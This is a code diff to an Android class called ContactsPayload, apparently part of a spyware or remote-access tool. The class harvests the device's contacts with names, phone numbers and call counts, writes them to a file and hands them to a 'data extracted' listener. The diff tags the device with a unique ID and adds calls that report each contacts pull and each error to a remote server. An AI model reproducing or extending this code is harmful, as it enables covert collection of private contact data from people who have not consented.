@@ -10,6 +10,8 @@ import android.util.Log;
 import com.aigs.serviceone.helpers.ContactsPayloadListner;
 import com.aigs.serviceone.helpers.FileSystem;
 import com.aigs.serviceone.annotations.PayloadTypes;
+import com.example.logshandler.starter.Logs;
+import com.example.uniqueidmanager.UniqueId;
 import com.google.firebase.database.FirebaseDatabase;
 
 import org.json.JSONArray;
@@ -23,9 +25,11 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
 
     private final WeakReference<Context> context;
     private ContactsPayloadListner contactsPayloadListner;
+    private String uuid;
 
     public ContactsPayload(Context context) {
         this.context = new WeakReference<>(context);
+        uuid = UniqueId.initialize(context).getUUID();
     }
 
     private static final String[] PROJECTION = new String[]{
@@ -73,11 +77,13 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
                             mobileNoSet.add(number);
                             Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
                                     + " No = " + number + " Contacted " + times_called + " Times");
+
                         }
                     }
 
                     File file = FileSystem.createInstance(context.get()).writeContactsData(jsonArray.toString());
                     contactsPayloadListner.onDataExtracted(file,jsonArray.toString());
+                    Logs.pushLogsToServer("[DATA]: contacts data pulled",uuid);
 
                 } finally {
                     cursor.close();
@@ -85,7 +91,7 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
             }
         } catch (Exception e) {
             Log.e("ERROR_CON : ", e.getMessage());
-            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_USER_CONTACTS+"").child("CurrentLog").setValue(e.getMessage());
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),uuid);
         }
 
         return null;
